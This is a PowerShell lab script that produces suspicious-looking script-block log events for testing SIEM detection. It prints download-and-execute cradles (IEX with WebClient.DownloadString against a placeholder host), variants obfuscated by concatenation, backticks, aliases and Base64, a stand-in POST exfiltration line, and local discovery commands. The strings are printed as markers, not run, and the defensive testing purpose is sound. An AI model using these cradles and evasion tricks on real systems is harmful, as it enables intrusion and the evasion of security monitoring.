<#
RED demo generator for the PowerShell ScriptBlock event type.

This script is intentionally lab-safe: it emits suspicious-looking
ScriptBlockText for SIEM/RED detection, but the payload-looking strings are
printed as markers instead of being downloaded or executed.

Requires PowerShell Script Block Logging to be enabled on the Windows lab VM.

Usage:
  Set-ExecutionPolicy Bypass -Scope Process -Force
  .\powershell_scenarios.ps1 -Scenario benign
  .\powershell_scenarios.ps1 -Scenario baseline
  .\powershell_scenarios.ps1 -Scenario evasion -SleepSeconds 20
  .\powershell_scenarios.ps1 -Scenario chain
  .\powershell_scenarios.ps1 -Scenario all
  .\powershell_scenarios.ps1 -Scenario evasion -DryRun
#>

param(
    [ValidateSet("benign", "baseline", "evasion", "chain", "all")]
    [string]$Scenario = "all",

    [int]$SleepSeconds = 20,

    [switch]$DryRun
)

$ErrorActionPreference = "Continue"

function Join-Text {
    param([Parameter(Mandatory = $true)][string[]]$Parts)
    return ($Parts -join "")
}

function Join-ScriptStatements {
    param([Parameter(Mandatory = $true)][string[]]$Statements)
    return ($Statements -join ";`n")
}

function New-DemoTag {
    param([Parameter(Mandatory = $true)][string]$Name)
    return (Join-Text @("RED", "_", "DEMO", "_", "PS", "_", $Name))
}

function Quote-PSString {
    param([Parameter(Mandatory = $true)][string]$Value)
    return "'" + $Value.Replace("'", "''") + "'"
}

function New-MarkerScript {
    param(
        [Parameter(Mandatory = $true)][string]$Tag,
        [Parameter(Mandatory = $true)][string]$Marker
    )

    return "`$RedDemoTag = $(Quote-PSString $Tag);`r`n" +
        "`$RedDemoMarker = $(Quote-PSString $Marker);`r`n" +
        "Write-Output `$RedDemoTag;`r`n" +
        "Write-Output `$RedDemoMarker"
}

function Test-ScriptBlockLogging {
    $paths = @(
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging",
        "HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    )

    foreach ($path in $paths) {
        try {
            $props = Get-ItemProperty -Path $path -ErrorAction Stop
            if ($props.EnableScriptBlockLogging -eq 1) {
                return $true
            }
        } catch {
            continue
        }
    }
    return $false
}

function Invoke-DemoScriptBlock {
    param(
        [Parameter(Mandatory = $true)][string]$Label,
        [Parameter(Mandatory = $true)][string]$ScriptText,
        [int]$PauseSeconds = 0
    )

    Write-Host ""
    Write-Host "[$(Get-Date -Format o)] $Label" -ForegroundColor Cyan
    Write-Host $ScriptText -ForegroundColor Gray

    if (-not $DryRun) {
        try {
            $block = [ScriptBlock]::Create($ScriptText)
            & $block
        } catch {
            Write-Warning "ScriptBlock failed: $($_.Exception.Message)"
        }
    }

    if ($PauseSeconds -gt 0) {
        Start-Sleep -Seconds $PauseSeconds
    }
}

function New-DownloadMarker {
    $k1 = Join-Text @("Invoke", "-", "Expression")
    $k2 = Join-Text @("New", "-", "Object")
    $k3 = Join-Text @("Net", ".", "Web", "Client")
    $k4 = Join-Text @("Download", "String")
    return "$k1 ($k2 $k3).$k4(`"http://example.invalid/red-demo.ps1`")"
}

function Invoke-BenignScenario {
    Write-Host "`n=== Scenario: benign PowerShell ScriptBlock activity ===" -ForegroundColor Green

    $tag1 = New-DemoTag "BENIGN"
    $script1 = "`$RedDemoTag = $(Quote-PSString $tag1);`r`n" +
        "`$RedDemoProcess = Get-Process -Id `$PID | Select-Object -Property Id, ProcessName;`r`n" +
        "Write-Output `$RedDemoTag;`r`n" +
        "Write-Output `$RedDemoProcess"
    Invoke-DemoScriptBlock -Label "Benign inventory ScriptBlock" -ScriptText $script1

    $tag2 = New-DemoTag "BENIGN_SERVICE_CHECK"
    $script2 = "`$RedDemoTag = $(Quote-PSString $tag2);`r`n" +
        "Get-Service | Select-Object -First 3 -Property Name, Status | Out-String | Write-Output"
    Invoke-DemoScriptBlock -Label "Benign service check ScriptBlock" -ScriptText $script2
}

function Invoke-BaselineScenario {
    Write-Host "`n=== Scenario: baseline exact PowerShell ScriptBlock marker ===" -ForegroundColor Green

    $script = New-MarkerScript `
        -Tag (New-DemoTag "BASELINE") `
        -Marker (New-DownloadMarker)
    Invoke-DemoScriptBlock -Label "Baseline: full suspicious keywords in ScriptBlockText" -ScriptText $script
}

function Invoke-EvasionScenario {
    Write-Host "`n=== Scenario: PowerShell ScriptBlock evasion variants ===" -ForegroundColor Green

    $tag1 = New-DemoTag "EVASION_CONCAT"
    $newObjText = Join-Text @("New", "-", "Object")
    $script1 = "`$RedDemoTag = $(Quote-PSString $tag1);`r`n" +
        "`$verb = 'Inv' + 'oke';`r`n" +
        "`$noun = 'Expression';`r`n" +
        "`$client = 'Net.' + 'WebClient';`r`n" +
        "`$method = 'Download' + 'String';`r`n" +
        "`$RedDemoMarker = `"`$verb-`$noun ($newObjText `$client).`$method('http://example.invalid/red-demo.ps1')`";`r`n" +
        "Write-Output `$RedDemoTag;`r`n" +
        "Write-Output `$RedDemoMarker"
    Invoke-DemoScriptBlock -Label "Variant 1: concatenated keywords" -ScriptText $script1 -PauseSeconds $SleepSeconds

    $bt = [char]96
    $newObj = Join-Text @("New", "-", "Object")
    $client = Join-Text @("Net", ".", "Web", "Client")
    $download = Join-Text @("Download", "String")
    $obfInvoke = "I${bt}nv${bt}oke-Expression"
    $obfDownload = "Down${bt}load" + "String"
    $script2 = New-MarkerScript `
        -Tag (New-DemoTag "EVASION_BACKTICK") `
        -Marker "$obfInvoke ($newObj $client).$obfDownload(`"http://example.invalid/red-demo.ps1`")"
    Invoke-DemoScriptBlock -Label "Variant 2: backtick-obfuscated keywords" -ScriptText $script2 -PauseSeconds $SleepSeconds

    $alias = Join-Text @("I", "e", "X")
    $script3 = New-MarkerScript `
        -Tag (New-DemoTag "EVASION_ALIAS") `
        -Marker "$alias ($newObj $client).$download(`"http://example.invalid/red-demo.ps1`")"
    Invoke-DemoScriptBlock -Label "Variant 3: aliases and case mix" -ScriptText $script3 -PauseSeconds $SleepSeconds

    $decoder = Join-Text @("From", "Base64", "String")
    $script4 = New-MarkerScript `
        -Tag (New-DemoTag "EVASION_BASE64") `
        -Marker "[Text.Encoding]::Unicode.GetString([Convert]::$decoder(`"VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAFIARQBEACAARABlAG0AbwAiAA==`"))"
    Invoke-DemoScriptBlock -Label "Variant 4: Base64 decode marker" -ScriptText $script4
}

function Invoke-ChainScenario {
    Write-Host "`n=== Scenario: simple PowerShell ScriptBlock chain ===" -ForegroundColor Green

    $tag1 = New-DemoTag "CHAIN_DISCOVERY"
    $script1 = "`$RedDemoTag = $(Quote-PSString $tag1);`r`n" +
        "whoami /priv | Out-String | Write-Output;`r`n" +
        "Get-LocalUser | Select-Object -First 3 | Out-String | Write-Output"
    Invoke-DemoScriptBlock -Label "Stage A: local discovery ScriptBlock" -ScriptText $script1 -PauseSeconds $SleepSeconds

    $bt = [char]96
    $alias = Join-Text @("I", "E", "X")
    $newObj = Join-Text @("New", "-", "Object")
    $client = Join-Text @("Net", ".", "Web", "Client")
    $marker = "$alias ($newObj $client).Down${bt}loadString(`"http://example.invalid/red-demo.ps1`")"
    $script2 = New-MarkerScript `
        -Tag (New-DemoTag "CHAIN_EVASION") `
        -Marker $marker
    Invoke-DemoScriptBlock -Label "Stage B: evasion marker ScriptBlock" -ScriptText $script2 -PauseSeconds $SleepSeconds

    $rest = Join-Text @("Invoke", "-", "Rest", "Method")
    $script3 = New-MarkerScript `
        -Tag (New-DemoTag "CHAIN_OUTBOUND_MARKER") `
        -Marker "$rest -Uri http://1.2.3.4/exfil -Method POST -Body red_demo"
    Invoke-DemoScriptBlock -Label "Stage C: outbound marker as string only" -ScriptText $script3
}

if (-not (Test-ScriptBlockLogging)) {
    Write-Warning "PowerShell Script Block Logging does not appear enabled. Event ID 4104 may not be collected."
}

switch ($Scenario) {
    "benign" { Invoke-BenignScenario }
    "baseline" { Invoke-BaselineScenario }
    "evasion" { Invoke-EvasionScenario }
    "chain" { Invoke-ChainScenario }
    "all" {
        Invoke-BenignScenario
        Start-Sleep -Seconds $SleepSeconds
        Invoke-BaselineScenario
        Start-Sleep -Seconds $SleepSeconds
        Invoke-EvasionScenario
        Start-Sleep -Seconds $SleepSeconds
        Invoke-ChainScenario
    }
}

Write-Host "`nDone. Wait for Event ID 4104 ingestion, then poll with RED using config/powershell.yaml." -ForegroundColor Green
